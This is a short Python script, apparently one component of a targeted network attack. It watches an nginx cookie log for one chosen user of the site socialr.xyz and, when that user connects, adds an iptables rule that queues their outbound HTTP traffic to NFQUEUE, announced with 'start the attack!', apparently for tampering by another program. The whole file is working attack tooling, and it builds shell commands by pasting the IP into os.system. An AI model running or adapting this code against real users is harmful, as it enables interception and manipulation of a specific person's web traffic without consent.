#!/usr/bin/python

import subprocess
import re
import os
logfilename = '/var/log/nginx/cookies.log'

os.system('>' + logfilename)

f = subprocess.Popen(['tail','-F', logfilename],\
        stdout=subprocess.PIPE,stderr=subprocess.PIPE)

logre = re.compile(r'(\S+) \[([^\]]+)\] \[([^\]]+)\] \[([^\]]+)\]')

print 'getting username to target...'
usernamef = open('username.txt', 'r')
targetusername = usernamef.read().strip().lower()
print 'we are targeting user ' + targetusername

os.system('sudo ./stoptables.sh')
haveSetTables = False

while True:
  line = f.stdout.readline()
  m = logre.match(line)
  if m:
    ip = m.group(1)
    date = m.group(2)
    username = m.group(3)
    host = m.group(4)
    assert(host == 'socialr.xyz')
    print 'user ' + username + ' connected from ip ' + ip + ' at ' + date
    if username == targetusername and not haveSetTables:
      print "that's the user we want! start the attack!"
      os.system('sudo iptables -A OUTPUT -p tcp -d ' + ip + ' --sport 80 -j NFQUEUE --queue-num 0')
      haveSetTables = True
